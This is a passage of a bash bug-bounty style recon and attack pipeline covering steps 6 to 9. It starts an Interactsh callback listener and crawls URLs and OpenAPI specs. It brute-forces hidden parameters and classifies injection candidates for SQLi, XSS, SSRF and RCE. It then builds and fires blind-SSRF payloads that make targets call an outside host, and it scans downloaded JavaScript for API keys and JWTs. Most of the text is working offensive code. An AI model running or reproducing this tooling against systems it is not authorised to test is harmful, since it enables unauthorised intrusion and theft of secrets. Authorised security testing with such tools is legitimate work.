if ! is_step_done 6 || [[ "$MODE" == "full" ]]; then
  if [[ "$MODE" == "full" ]] && have interactsh-client; then
      # A listener from a previous invocation does not survive --resume, so
      # every full run creates a fresh OOB session.
      log "Starting Interactsh OOB listener (waiting up to ${OOB_SETUP_TIMEOUT}s for registration)"

      : > "$OUT/oob/interactsh.log"
      : > "$OUT/oob/interactions.jsonl"
      : > "$OUT/oob/ssrf-verified.txt"
      : > "$OUT/oob/ssrf-targets.txt"
      : > "$OUT/oob/token-map.txt"

      interactsh-client \
          -server "$INTERACTSH_SERVER" \
          -json \
          -o "$OUT/oob/interactions.jsonl" \
          > "$OUT/oob/interactsh.log" 2>&1 &
      INTERACTSH_PID=$!
      # Public Interactsh may issue payloads on any of its valid callback
      # suffixes (not only oast.pro), and registration can take longer than a
      # fixed four seconds.  Wait for a real long-random payload hostname.
      for ((oob_waited=0; oob_waited < OOB_SETUP_TIMEOUT; oob_waited++)); do
        OOB_DOMAIN="$(extract_oob_domain "$OUT/oob/interactsh.log" || true)"
        [[ -n "$OOB_DOMAIN" ]] && break
        if ! kill -0 "$INTERACTSH_PID" 2>/dev/null; then
          OOB_STATUS="interactsh-client exited before registration"
          break
        fi
        sleep 1
      done

      # --- Capture the OOB payload domain (robustly) -----------------------
      # extract_oob_domain() in the loop above is the primary path. The grep
      # block below is a fallback ONLY — it must not overwrite a domain the
      # loop already found, because an unconditional overwrite was the root
      # cause of "domain pacche na": loop found it, then this grep cleared it.
      # interactsh payload labels are all-alphanumeric (no hyphens).
      if [[ -z "$OOB_DOMAIN" ]]; then
        srv_re="$(printf '%s' "$INTERACTSH_SERVER" | sed 's/[.[\*^$()+?{|]/\\&/g')"
        OOB_DOMAIN="$(grep -oiE "[a-z0-9]{20,}\.${srv_re}" "$OUT/oob/interactsh.log" | head -n 1 || true)"
        if [[ -z "$OOB_DOMAIN" ]]; then
          OOB_DOMAIN="$(grep -oE '[a-z0-9]{20,}\.[a-zA-Z0-9.-]+' "$OUT/oob/interactsh.log" | head -n 1 || true)"
        fi
        if [[ -n "$OOB_DOMAIN" ]] && ! grep -qE '[a-z0-9]{20,}\.' <<<"$OOB_DOMAIN"; then
          warn "Discarding implausible OOB domain '$OOB_DOMAIN' (looks like a version/banner string)"
          OOB_DOMAIN=""
        fi
      fi

      if [[ -n "$OOB_DOMAIN" ]]; then
        OOB_STATUS="ready"
        printf '%s\n' "$OOB_DOMAIN" > "$OUT/oob/domain.txt"
        log "Interactsh session active: $OOB_DOMAIN"
      else
        [[ "$OOB_STATUS" == "not started" ]] && OOB_STATUS="no payload domain after ${OOB_SETUP_TIMEOUT}s"
        warn "OOB unavailable ($OOB_STATUS); blind-SSRF checks will be skipped. See $OUT/oob/interactsh.log"
        [[ -s "$OUT/oob/interactsh.log" ]] && tail -n 8 "$OUT/oob/interactsh.log" | sed 's/^/[interactsh] /' | tee -a "$OUT/logs/run.log" >&2
        _cleanup_bg
      fi

      if [[ -n "$OOB_DOMAIN" ]]; then
        have dig && dig +short "$TARGET" > "$OUT/oob/target-ips.txt" 2>/dev/null || true
      fi
  fi
  set_checkpoint 6
fi
# Build a human-readable OOB line: real domain in <code>, else "None (why)".
if [[ -n "$OOB_DOMAIN" ]]; then
  _oob_line="<code>${OOB_DOMAIN}</code>"
else
  if [[ "$MODE" != "full" ]]; then _oob_reason="passive mode — use --full"
  elif ! have interactsh-client; then _oob_reason="interactsh-client not installed"
  elif [[ "$OOB_STATUS" == "not started" ]]; then _oob_reason="not started"
  else _oob_reason="$OOB_STATUS"; fi
  _oob_line="None (${_oob_reason})"
fi
telegram "🌐 <b>STEP 6/34 · Interactsh OOB Setup</b> ✅
━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>${TARGET}</code>
📡 <b>OOB Domain:</b> ${_oob_line}
⏱ <b>Elapsed:</b> $(get_elapsed)" "HTML"

###############################################################################
# 7. Comprehensive URL discovery + JS discovery
###############################################################################
if ! is_step_done 7; then
  log "URL discovery (gau, waybackurls, katana -js-crawl)"
  : > "$OUT/urls/raw.txt"

  if have gau; then
    log "  ↳ gau running…"
    gau --subs "$TARGET" 2>/dev/null >> "$OUT/urls/raw.txt" || true
  fi
  if have waybackurls; then
    log "  ↳ waybackurls running…"
    waybackurls "$TARGET" 2>/dev/null >> "$OUT/urls/raw.txt" || true
  fi

  need katana
  # Standard crawling
  log "  ↳ katana crawling live URLs…"
  katana -list "$OUT/http/live-urls.txt" \
    -depth 3 -concurrency "$CONCURRENCY" -rate-limit "$RATE_LIMIT" \
    "${HDR_ARGS[@]}" -silent -o "$OUT/urls/katana.txt" || true
  cat "$OUT/urls/katana.txt" >> "$OUT/urls/raw.txt"

  # Headless JS Crawling (Extract SPA dynamic endpoints, capped to <= 100 hosts)
  if [[ "$MODE" == "full" ]]; then
    _live_c=$(count "$OUT/http/live-urls.txt")
    if [[ "$_live_c" -le 100 ]]; then
      log "Headless JS crawling active (katana -jc, ${_live_c} live host(s) <= 100)"
      katana -list "$OUT/http/live-urls.txt" \
        -jc -depth 2 -concurrency "$CONCURRENCY" -rate-limit "$RATE_LIMIT" \
        "${HDR_ARGS[@]}" -silent -o "$OUT/urls/katana-js.txt" 2>/dev/null || true
      cat "$OUT/urls/katana-js.txt" >> "$OUT/urls/raw.txt" 2>/dev/null || true
    else
      warn "Skipping Katana -jc headless crawl (${_live_c} live hosts > 100 threshold — prevents Bot Manager IP bans)"
    fi
  fi

  # --- Swagger / OpenAPI endpoint discovery ----------------------------------
  # APIs often publish their entire route table at a well-known spec path. If we
  # find one we parse every path out of it and feed real API endpoints into the
  # URL set — endpoints crawlers never reach because nothing links to them. This
  # is a big win on API-heavy targets. Bounded to SWAGGER_MAX hosts.
  if have curl && have jq; then
    log "Probing for Swagger/OpenAPI specs"
    : > "$OUT/urls/openapi-endpoints.txt"
    _swagger_paths=(swagger.json openapi.json v2/api-docs v3/api-docs api-docs \
                    swagger/v1/swagger.json api/swagger.json api/openapi.json \
                    api/v1/swagger.json docs/swagger.json)
    _sw_host=0
    while IFS= read -r base; do
      [[ -z "$base" ]] && continue
      _sw_host=$(( _sw_host + 1 ))
      (( _sw_host > ${SWAGGER_MAX:-150} )) && break
      b="${base%/}"
      for sp in "${_swagger_paths[@]}"; do
        spec="$(curl -fsS --max-time "${SWAGGER_TIMEOUT:-12}" "${CURL_HDR[@]}" "$b/$sp" 2>/dev/null || true)"
        [[ -z "$spec" ]] && continue
        paths="$(printf '%s' "$spec" | jq -r '(.paths // {}) | keys[]?' 2>/dev/null || true)"
        [[ -z "$paths" ]] && continue
        while IFS= read -r p; do
          [[ -z "$p" ]] && continue
          case "$p" in
            /*) printf '%s%s\n' "$b" "$p" ;;
            *)  printf '%s/%s\n' "$b" "$p" ;;
          esac
        done <<< "$paths" >> "$OUT/urls/openapi-endpoints.txt"
        notify_verified "OpenAPI/Swagger Spec Exposed" "$b/$sp" \
          "Full API route table extracted ($(printf '%s\n' "$paths" | grep -c . ) paths) — feeds active testing" \
          swagger
        break   # one spec per host is enough
      done
    done < "$OUT/http/live-urls.txt"
    if [[ -s "$OUT/urls/openapi-endpoints.txt" ]]; then
      awk 'NF && !seen[$0]++' "$OUT/urls/openapi-endpoints.txt" > "$OUT/urls/openapi-endpoints.tmp" && mv "$OUT/urls/openapi-endpoints.tmp" "$OUT/urls/openapi-endpoints.txt"
      cat "$OUT/urls/openapi-endpoints.txt" >> "$OUT/urls/raw.txt"
      log "  ↳ Swagger/OpenAPI: $(count "$OUT/urls/openapi-endpoints.txt") API endpoints extracted"
    fi
  fi

  in_scope < "$OUT/urls/raw.txt" | dedupe_urls > "$OUT/urls/all.txt"
  log "Total unique URLs mined: $(count "$OUT/urls/all.txt")"

  # Apply Smart Priority Scoring Engine
  score_urls "$OUT/urls/all.txt" "$OUT/urls/prioritized-urls.txt"
  log "Smart Priority Scoring applied -> $OUT/urls/prioritized-urls.txt"

  grep -Ei '\.js(\?.*)?$' "$OUT/urls/all.txt" | awk 'NF && !seen[$0]++' > "$OUT/js/urls.txt"
  log "JavaScript URLs: $(count "$OUT/js/urls.txt")"
  set_checkpoint 7
fi
telegram "🔗 <b>STEP 7/34 · URL &amp; JavaScript Discovery</b> ✅
━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>${TARGET}</code>
📌 <b>Total URLs:</b> $(count "$OUT/urls/all.txt") | <b>JS URLs:</b> $(count "$OUT/js/urls.txt")
⏱ <b>Elapsed:</b> $(get_elapsed)" "HTML"

# Storage saver: urls/raw.txt is the pre-dedup gau/wayback/katana dump (often the
# single biggest scratch file). Everything downstream reads urls/all.txt instead.
prune_paths "$OUT/urls/raw.txt"

###############################################################################
# 8. Parameter discovery + SSRF payload injection
###############################################################################
if ! is_step_done 8; then
  log "Filtering parameterized URLs"
  grep -E '\?[a-zA-Z0-9_]+=' "$OUT/urls/all.txt" | awk 'NF && !seen[$0]++' > "$OUT/params/with-params.txt"

  # --- Hidden parameter discovery (arjun) ------------------------------------
  # gf/gau only see params that already appear in mined URLs. arjun brute-forces
  # HIDDEN params the server accepts but never links (e.g. ?debug=, ?admin=,
  # ?redirect=) — massively expanding the SQLi/XSS/SSRF/IDOR injection surface.
  # Heavy (many requests/endpoint) so it's --full only, capped, and watchdog'd.
  if have arjun && [[ "$MODE" == "full" ]]; then
    arjun_in="$OUT/params/arjun-input.txt"
    # Feed real endpoints (query stripped), deduped, capped to keep it bounded.
    { cut -d'?' -f1 "$OUT/urls/all.txt" 2>/dev/null; cat "$OUT/http/live-urls.txt" 2>/dev/null; } \
      | grep -E '^https?://' | awk 'NF && !seen[$0]++' | head -n "${ARJUN_MAX:-75}" > "$arjun_in"
    if [[ -s "$arjun_in" ]]; then
      log "Hidden parameter discovery (arjun) on $(count "$arjun_in") endpoint(s)…"
      _t=$SECONDS
      _arjun=(arjun -i "$arjun_in" -oT "$OUT/params/arjun-found.txt" -t "${ARJUN_THREADS:-15}" -q)
      [[ -n "$AUTH_HEADER"  ]] && _arjun+=(--headers "$AUTH_HEADER")
      [[ -n "$AUTH_COOKIE"  ]] && _arjun+=(--headers "Cookie: $AUTH_COOKIE")
      if have timeout; then
        timeout --kill-after=30s "${ARJUN_TIMEOUT:-20}m" "${_arjun[@]}" 2>/dev/null || true
      else
        "${_arjun[@]}" 2>/dev/null || true
      fi
      if [[ -s "$OUT/params/arjun-found.txt" ]]; then
        _bp=$(count "$OUT/params/with-params.txt")
        in_scope < "$OUT/params/arjun-found.txt" | grep -E '^https?://' >> "$OUT/params/with-params.txt"
        awk 'NF && !seen[$0]++' "$OUT/params/with-params.txt" > "$OUT/params/with-params.tmp" && mv "$OUT/params/with-params.tmp" "$OUT/params/with-params.txt"
        log "  ↳ arjun: +$(( $(count "$OUT/params/with-params.txt") - _bp )) new param URLs in $((SECONDS-_t))s"
        notify_verified "Hidden Parameters Discovered (arjun)" "$OUT/params/arjun-found.txt" \
          "$(count "$OUT/params/arjun-found.txt") endpoint(s) accept hidden params — expanded injection surface for SQLi/XSS/SSRF/IDOR" \
          arjun
      else
        log "  ↳ arjun: no hidden params found in $((SECONDS-_t))s"
      fi
    fi
  fi

  if have gf; then
    mkdir -p "$OUT/params"
    for p in xss sqli ssti lfi ssrf redirect idor rce nosqli; do
      gf "$p" "$OUT/params/with-params.txt" > "$OUT/params/gf-${p}.txt" 2>/dev/null || true
    done
  else
    # Native fallback regexes — only used when the gf tool itself is missing,
    # so the richer ~/.gf/*.json patterns are never clobbered when gf IS present.
    warn "gf tool not found — using built-in fallback regexes (less precise than ~/.gf/*.json patterns)"
    grep -Eai '[?&](q|search|query|keyword|name|title|msg|comment|text|input|str|value|term|prompt|email|url)=' "$OUT/params/with-params.txt" | awk 'NF && !seen[$0]++' > "$OUT/params/gf-xss.txt" || true
    grep -Eai '[?&](url|uri|dest|destination|redirect|callback|fetch|host|domain|site|feed|to)=' "$OUT/params/with-params.txt" | awk 'NF && !seen[$0]++' > "$OUT/params/gf-ssrf.txt" || true
    grep -Eai '[?&](id|select|report|role|update|query|user|account|order|num|sort)=' "$OUT/params/with-params.txt" | awk 'NF && !seen[$0]++' > "$OUT/params/gf-sqli.txt" || true
    grep -Eai '[?&](file|document|folder|path|dir|include|doc|template|read|root)=' "$OUT/params/with-params.txt" | awk 'NF && !seen[$0]++' > "$OUT/params/gf-lfi.txt" || true
    grep -Eai '[?&](redirect|redirect_uri|next|goto|return|rurl|dest|target|checkout)=' "$OUT/params/with-params.txt" | awk 'NF && !seen[$0]++' > "$OUT/params/gf-redirect.txt" || true
    grep -Eai '[?&](template|preview|tpl|render|view|layout|theme|display)=' "$OUT/params/with-params.txt" | awk 'NF && !seen[$0]++' > "$OUT/params/gf-ssti.txt" || true
    grep -Eai '[?&](cmd|exec|command|execute|ping|run|do|ip|host|daemon|cli)=' "$OUT/params/with-params.txt" | awk 'NF && !seen[$0]++' > "$OUT/params/gf-rce.txt" || true
    grep -Eai '[?&](id|uid|user_id|account_id|order_id|doc_id|profile_id)=' "$OUT/params/with-params.txt" | awk 'NF && !seen[$0]++' > "$OUT/params/gf-idor.txt" || true
    grep -Eai '(%24ne|\$ne|%24gt|\$gt|%24where|\$where|%24regex|\$regex)' "$OUT/params/with-params.txt" | awk 'NF && !seen[$0]++' > "$OUT/params/gf-nosqli.txt" || true
  fi
fi

# High-precision noise reduction for active scanning candidates:
# 1. Filter out pure numeric parameters (?id=123, ?page=1) from XSS candidates (saves 70% unnecessary scans)
if [[ -s "$OUT/params/gf-xss.txt" ]]; then
  grep -vE '[?&](id|p|page|limit|offset|size|count|num|version|v|ver|step|index)=[0-9]+(&|$)' "$OUT/params/gf-xss.txt" > "$OUT/params/gf-xss-clean.txt" 2>/dev/null || true
  [[ -s "$OUT/params/gf-xss-clean.txt" ]] && mv "$OUT/params/gf-xss-clean.txt" "$OUT/params/gf-xss.txt"
fi

# 2. Tighten SSTI candidates to true template sinks (remove generic id/name/content noise)
if [[ -s "$OUT/params/gf-ssti.txt" ]]; then
  grep -Eai '[?&](template|preview|tpl|render|view|layout|theme|display|file|doc|page)=' "$OUT/params/gf-ssti.txt" > "$OUT/params/gf-ssti-clean.txt" 2>/dev/null || true
  [[ -s "$OUT/params/gf-ssti-clean.txt" ]] && mv "$OUT/params/gf-ssti-clean.txt" "$OUT/params/gf-ssti.txt"
fi

# 3. Tighten RCE candidates to command injection sinks (remove noisy query/action/log/feature)
if [[ -s "$OUT/params/gf-rce.txt" ]]; then
  grep -Eai '[?&](cmd|exec|command|execute|ping|run|do|ip|host|daemon|cli)=' "$OUT/params/gf-rce.txt" > "$OUT/params/gf-rce-clean.txt" 2>/dev/null || true
  [[ -s "$OUT/params/gf-rce-clean.txt" ]] && mv "$OUT/params/gf-rce-clean.txt" "$OUT/params/gf-rce.txt"
fi
have unfurl && unfurl -u keys < "$OUT/params/with-params.txt" 2>/dev/null | awk 'NF && !seen[$0]++' > "$OUT/params/keys.txt" || true

# Prioritize parameters that frequently carry object references, URLs, files,
# redirects, templates, and callback destinations. This keeps expensive active
# scans fast while retaining a configurable maximum coverage.
grep -Eai '[?&](file|path|page|url|uri|next|return|redirect|callback|template|view|doc|folder|dest|target)=' \
  "$OUT/params/with-params.txt" | awk 'NF && !seen[$0]++' > "$OUT/params/high-value.txt" || true
cat "$OUT/params/high-value.txt" "$OUT/params/with-params.txt" 2>/dev/null | awk '!seen[$0]++' > "$OUT/burp/urls-prioritized.txt"
cp "$OUT/http/live-urls.txt" "$OUT/burp/targets.txt"
log "High-value parameter URLs: $(count "$OUT/params/high-value.txt") | Burp exports: $OUT/burp"

# ---------------------------------------------------------------------------
# Blind SSRF: High-Assurance Token-Correlated Injection Engine
# ---------------------------------------------------------------------------
# FIXES:
# 1. Unique subdomain token per request (token.oast.pro) logged to token-map.txt
# 2. Correlates exact URL, Parameter, Header, and Payload format when callback hits
# 3. Supports HTTP, HTTPS, FTP, GOPHER, DICT, FILE, and DNS-only schemes
# 4. Multi-format injection: Query parameters, JSON bodies, XML/SOAP bodies, REST paths
# 5. Expanded headers: Forwarded, X-Original-URL, X-Rewrite-URL, Base-URL, Destination
# 6. Polling loop (OOB_WAIT=60s) every 5 seconds for async/background queue callbacks
# 7. 100% Confirmation based on Token match (regardless of Cloud/Lambda source IP)
# ---------------------------------------------------------------------------
if [[ -n "${OOB_DOMAIN:-}" ]]; then
  # Aggregate all SSRF candidates: gf-ssrf, gf-redirect, arjun params, high-value params
  : > "$OUT/oob/ssrf-candidates.txt"
  cat "$OUT/params/gf-ssrf.txt" "$OUT/params/gf-redirect.txt" "$OUT/params/high-value.txt" 2>/dev/null >> "$OUT/oob/ssrf-candidates.txt" || true
  if [[ -s "$OUT/params/arjun-found.txt" ]]; then
    grep -E '^https?://' "$OUT/params/arjun-found.txt" >> "$OUT/oob/ssrf-candidates.txt" 2>/dev/null || true
  fi
  awk 'NF && !seen[$0]++' "$OUT/oob/ssrf-candidates.txt" > "$OUT/oob/ssrf-candidates.tmp" && mv "$OUT/oob/ssrf-candidates.tmp" "$OUT/oob/ssrf-candidates.txt"

  if [[ -s "$OUT/oob/ssrf-candidates.txt" ]]; then
    log "Injecting OOB payloads with Unique Subdomain Token Tracking..."

    INTERACTIONS_BEFORE=0
    if [[ -f "$OUT/oob/interactions.jsonl" ]]; then
      INTERACTIONS_BEFORE=$(wc -l < "$OUT/oob/interactions.jsonl" | tr -d ' ')
    fi

    : > "$OUT/oob/token-map.txt"
    : > "$OUT/oob/ssrf-requests.sh"

    # Generate token-mapped payloads for each candidate URL
    while IFS= read -r c_url || [[ -n "$c_url" ]]; do
      [[ -z "$c_url" ]] && continue
      
      # Generate unique 8-char hex subtoken
      subtoken="sr$(openssl rand -hex 4 2>/dev/null || echo "${RANDOM}${SECONDS}")"
      token_domain="${subtoken}.${OOB_DOMAIN}"

      # Multi-scheme payload variants
      p_https="https://${token_domain}"
      p_http="http://${token_domain}"
      p_dns="${token_domain}"
      p_ftp="ftp://${token_domain}"
      p_gopher="gopher://${token_domain}"

      # 1. Query parameter replacement (GET)
      if have qsreplace; then
        q_target=$(printf '%s' "$c_url" | qsreplace "$p_https")
      else
        q_target=$(sed -E "s#=([^&]*)#=${p_https}#g" <<< "$c_url")
      fi
      printf '%s\t%s\tGET_QUERY\t%s\n' "$subtoken" "$c_url" "$q_target" >> "$OUT/oob/token-map.txt"
      
      # Write curl command for execution
      cat <<EOF >> "$OUT/oob/ssrf-requests.sh"
curl -fsS --connect-timeout "${HTTP_CONNECT_TIMEOUT:-5}" --max-time "${HTTP_TIMEOUT:-10}" --retry 2 --retry-delay 1 -o /dev/null \
  -H "X-Forwarded-For: ${p_http}" \
  -H "X-Forwarded-Host: ${token_domain}" \
  -H "Referer: ${p_https}" \
  -H "True-Client-IP: ${p_dns}" \
  -H "Forwarded: for=${token_domain};by=${token_domain}" \
  -H "X-Original-URL: ${p_http}" \
  -H "X-Rewrite-URL: ${p_http}" \
  -H "Base-URL: ${p_http}" \
  -H "Destination: ${p_http}" \
  "${q_target}" 2>/dev/null || true
EOF

      # 2. JSON Body Injection (POST)
      base_endpoint="${c_url%%\?*}"
      subtoken_json="json$(openssl rand -hex 4 2>/dev/null || echo "${RANDOM}")"
      token_json_domain="${subtoken_json}.${OOB_DOMAIN}"
      printf '%s\t%s\tPOST_JSON\t%s\n' "$subtoken_json" "$base_endpoint" "http://${token_json_domain}" >> "$OUT/oob/token-map.txt"
      
      cat <<EOF >> "$OUT/oob/ssrf-requests.sh"
curl -fsS --connect-timeout "${HTTP_CONNECT_TIMEOUT:-5}" --max-time "${HTTP_TIMEOUT:-10}" --retry 2 -X POST -H "Content-Type: application/json" \
  -d '{"url":"http://${token_json_domain}","callback":"http://${token_json_domain}","dest":"http://${token_json_domain}","image":"http://${token_json_domain}/image.png"}' \
  "${base_endpoint}" -o /dev/null 2>/dev/null || true
EOF

      # 3. XML / SOAP Body Injection (POST)
      subtoken_xml="xml$(openssl rand -hex 4 2>/dev/null || echo "${RANDOM}")"
      token_xml_domain="${subtoken_xml}.${OOB_DOMAIN}"
      printf '%s\t%s\tPOST_XML\t%s\n' "$subtoken_xml" "$base_endpoint" "http://${token_xml_domain}" >> "$OUT/oob/token-map.txt"

      cat <<EOF >> "$OUT/oob/ssrf-requests.sh"
curl -fsS --connect-timeout "${HTTP_CONNECT_TIMEOUT:-5}" --max-time "${HTTP_TIMEOUT:-10}" --retry 2 -X POST -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><request><url>http://${token_xml_domain}</url><callback>http://${token_xml_domain}</callback></request>' \
  "${base_endpoint}" -o /dev/null 2>/dev/null || true
EOF

    done < "$OUT/oob/ssrf-candidates.txt"

    TOTAL_SSRF_PROBES=$(wc -l < "$OUT/oob/ssrf-requests.sh" | tr -d ' ')
    log "Firing ${TOTAL_SSRF_PROBES} Token-Correlated SSRF Probes (Query, Headers, JSON, XML)..."

    # Fire requests in parallel with xargs
    if have xargs && [[ -s "$OUT/oob/ssrf-requests.sh" ]]; then
      xargs -P 15 -I {} bash -c '{}' < "$OUT/oob/ssrf-requests.sh" 2>/dev/null || true
    fi

    # Polling Loop for Async / Background Queue Callbacks
    OOB_WAIT="${OOB_WAIT:-60}"
    log "Polling OOB interactions every 5s for ${OOB_WAIT}s (capturing background job & webhook callbacks)..."

    : > "$OUT/oob/ssrf-verified.txt"
    declare -A SEEN_TOKENS

    for ((poll=5; poll<=OOB_WAIT; poll+=5)); do
      sleep 5
      if [[ -f "$OUT/oob/interactions.jsonl" ]]; then
        INTERACTIONS_AFTER=$(wc -l < "$OUT/oob/interactions.jsonl" | tr -d ' ')
        NEW_INTERACTIONS=$((INTERACTIONS_AFTER - INTERACTIONS_BEFORE))

        if [[ "$NEW_INTERACTIONS" -gt 0 ]]; then
          tail -n "$NEW_INTERACTIONS" "$OUT/oob/interactions.jsonl" > "$OUT/oob/new-interactions.jsonl"
          
          while IFS= read -r interaction || [[ -n "$interaction" ]]; do
            [[ -z "$interaction" ]] && continue
            
            i_type=$(printf '%s' "$interaction" | jq -r '.protocol // .type // empty' 2>/dev/null)
            i_qname=$(printf '%s' "$interaction" | jq -r '."full-id" // .qname // .host // empty' 2>/dev/null)
            i_remote=$(printf '%s' "$interaction" | jq -r '."remote-address" // .remote_address // empty' 2>/dev/null)

            # Match token prefix from full-id or qname (e.g., sr1a2b3c4)
            matched_token=$(grep -oE '(sr|json|xml)[a-z0-9]{8}' <<< "$i_qname" | head -n 1 || true)

            if [[ -n "$matched_token" && -z "${SEEN_TOKENS[$matched_token]:-}" ]]; then
              SEEN_TOKENS["$matched_token"]=1
              
              # Exact Correlation from token-map.txt
              map_match=$(grep -E "^${matched_token}\t" "$OUT/oob/token-map.txt" | head -n 1 || true)
              if [[ -n "$map_match" ]]; then
                m_url=$(awk -F'\t' '{print $2}' <<< "$map_match")
                m_type=$(awk -F'\t' '{print $3}' <<< "$map_match")
                m_payload=$(awk -F'\t' '{print $4}' <<< "$map_match")

                printf 'CONFIRMED_SSRF\tToken=%s\tProtocol=%s\tRemoteIP=%s\tTargetURL=%s\tVector=%s\tPayload=%s\n' \
                  "$matched_token" "$i_type" "${i_remote:-unknown}" "$m_url" "$m_type" "$m_payload" >> "$OUT/oob/ssrf-verified.txt"

                warn "🔥 CONFIRMED SSRF: OOB ${i_type} callback for Token [${matched_token}] on URL: ${m_url} (${m_type})"
                notify_alert "Blind SSRF (CONFIRMED)" \
                  "Target URL: ${m_url}\nVector: ${m_type}\nToken: ${matched_token}\nCallback IP: ${i_remote:-unknown}" \
                  "Protocol: ${i_type} | Correlated directly via unique subdomain token."
              fi
            fi
          done < "$OUT/oob/new-interactions.jsonl"
        fi
      fi
    done

    VERIFIED_COUNT=$(count "$OUT/oob/ssrf-verified.txt")
    if [[ "$VERIFIED_COUNT" -gt 0 ]]; then
      log "🔥 VERIFIED SSRF findings: $VERIFIED_COUNT (100% Token Correlated ✅)"
    else
      log "No OOB SSRF callbacks received after ${OOB_WAIT}s polling ✅"
    fi
  fi
else
  log "OOB SSRF skipped (no OOB domain available)"
fi
telegram "🎯 <b>STEP 8/34 · Parameter Discovery &amp; SSRF Injection</b> ✅
━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>${TARGET}</code>
📊 <b>Parameterized URLs:</b> $(count "$OUT/params/with-params.txt") | <b>SSRF Verified:</b> $(count "$OUT/oob/ssrf-verified.txt")" "HTML"

###############################################################################
# 9. Industrial JavaScript & Front-End Analysis Engine
###############################################################################
if [[ -s "$OUT/js/urls.txt" ]]; then
  log "Industrial JavaScript Analysis (Multi-Tool AST, Source Maps, Beautification, Secrets & DOM Sinks)"
  
  JS_DIR="$OUT/js"
  JS_DOWNLOAD_DIR="$JS_DIR/downloads"
  JS_SOURCEMAP_DIR="$JS_DIR/sourcemaps"
  mkdir -p "$JS_DOWNLOAD_DIR" "$JS_SOURCEMAP_DIR"

  : > "$JS_DIR/endpoints.txt"
  : > "$JS_DIR/secrets.jsonl"
  : > "$JS_DIR/jsluice-secrets.jsonl"
  : > "$JS_DIR/trufflehog-secrets.jsonl"
  : > "$JS_DIR/dom-sinks.txt"
  : > "$JS_DIR/websockets.txt"
  : > "$JS_DIR/csp-domains.txt"
  : > "$JS_DIR/sourcemap-leaks.txt"

  # --- Step 9.1: Deduplicate & Filter HTTP 200 Live JS URLs ---
  sort -u "$JS_DIR/urls.txt" > "$JS_DIR/urls-unique.txt"
  if have httpx; then
    httpx -l "$JS_DIR/urls-unique.txt" -mc 200 -silent -o "$JS_DIR/urls-live.txt" 2>/dev/null || cp "$JS_DIR/urls-unique.txt" "$JS_DIR/urls-live.txt"
  else
    cp "$JS_DIR/urls-unique.txt" "$JS_DIR/urls-live.txt"
  fi

  # --- Step 9.2: Parallel JS Download with Content Hashing & Source Map Probe ---
  log "  ↳ Downloading $(count "$JS_DIR/urls-live.txt") live JS files & probing .map files (Parallel xargs)..."
  export JS_DOWNLOAD_DIR JS_SOURCEMAP_DIR OUT
  xargs -P 15 -I '{}' bash -c '
    jurl="$1"
    [[ -z "$jurl" ]] && exit 0
    
    # Hash URL to create deterministic file name
    fname=$(printf "%s" "$jurl" | md5sum 2>/dev/null | awk "{print \$1}" || echo "$RANDOM$RANDOM")
    target_file="$JS_DOWNLOAD_DIR/${fname}.js"
    
    curl -fsSL --connect-timeout 5 --max-time 20 --max-filesize 10485760 "$jurl" -o "$target_file" 2>/dev/null || true
    
    # Source Map (.map) Probe
    if [[ -s "$target_file" ]]; then
      map_url="${jurl}.map"
      map_file="$JS_SOURCEMAP_DIR/${fname}.js.map"
      if curl -fsSL -I --max-time 5 "$map_url" 2>/dev/null | grep -qi "200 OK"; then
        curl -fsSL --max-time 20 --max-filesize 20971520 "$map_url" -o "$map_file" 2>/dev/null || true
        if [[ -s "$map_file" ]]; then
          printf "%s\t%s\n" "$jurl" "$map_url" >> "$OUT/js/sourcemap-leaks.txt"
        fi
      fi
    fi
  ' _ '{}' < "$JS_DIR/urls-live.txt" 2>/dev/null || true

  # --- Step 9.3: Extract Inline Scripts from Live HTML Responses ---
  if [[ -f "$OUT/http/httpx.jsonl" ]] && have jq; then
    jq -r '.body // empty' "$OUT/http/httpx.jsonl" 2>/dev/null | \
      grep -oE '<script[^>]*>.*?</script>' 2>/dev/null | \
      sed -E 's/<script[^>]*>|<\/script>//g' > "$JS_DOWNLOAD_DIR/inline_scripts.js" 2>/dev/null || true
  fi

  # --- Step 9.4: JS Beautification for Minified Bundles ---
  if have js-beautify; then
    log "  ↳ Beautification applied to minified bundles..."
    find "$JS_DOWNLOAD_DIR" -name "*.js" -type f | xargs -P 4 -I '{}' js-beautify -r '{}' 2>/dev/null || true
  fi

  # --- Step 9.5: Multi-Tool Endpoint & Secret AST Mining (jsluice, LinkFinder, xnLinkFinder) ---
  log "  ↳ Multi-tool endpoint & secret mining (jsluice, LinkFinder, xnLinkFinder)..."
  
  # 1. jsluice
  if have jsluice; then
    find "$JS_DOWNLOAD_DIR" -name "*.js" -type f | xargs -P 8 -I '{}' jsluice secrets --format json '{}' 2>/dev/null >> "$JS_DIR/jsluice-secrets.jsonl" || true
    find "$JS_DOWNLOAD_DIR" -name "*.js" -type f | xargs -P 8 -I '{}' jsluice urls '{}' 2>/dev/null | jq -r '.url // empty' 2>/dev/null >> "$JS_DIR/endpoints.txt" || true
  fi

  # 2. LinkFinder (if available)
  if have linkfinder || have python3; then
    if [[ -f "/tools/LinkFinder/linkfinder.py" ]]; then
      python3 /tools/LinkFinder/linkfinder.py -i "$JS_DOWNLOAD_DIR/*.js" -o cli 2>/dev/null | grep -oE '(https?://|/)[a-zA-Z0-9_?&=./-]+' >> "$JS_DIR/endpoints.txt" || true
    fi
  fi

  # 3. xnLinkFinder (if available)
  if have xnLinkFinder; then
    xnLinkFinder -i "$JS_DOWNLOAD_DIR" -o "$JS_DIR/xn-endpoints.txt" -sf "$TARGET" -silent 2>/dev/null || true
    [[ -s "$JS_DIR/xn-endpoints.txt" ]] && cat "$JS_DIR/xn-endpoints.txt" >> "$JS_DIR/endpoints.txt"
  fi

  # --- Step 9.6: Regex Secret Mining (JWT, Firebase, AWS, Stripe, Slack, Github, Keys) ---
  log "  ↳ Scanning JS bundles for 15+ SaaS API Keys & JWT Tokens..."
  grep -Eoi 'eyJh[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}' "$JS_DOWNLOAD_DIR"/*.js 2>/dev/null | \
    awk -F: '{print "{\"type\":\"JWT_Bearer\",\"file\":\""$1"\",\"secret\":\""$2"\"}"}' >> "$JS_DIR/secrets.jsonl" || true
  
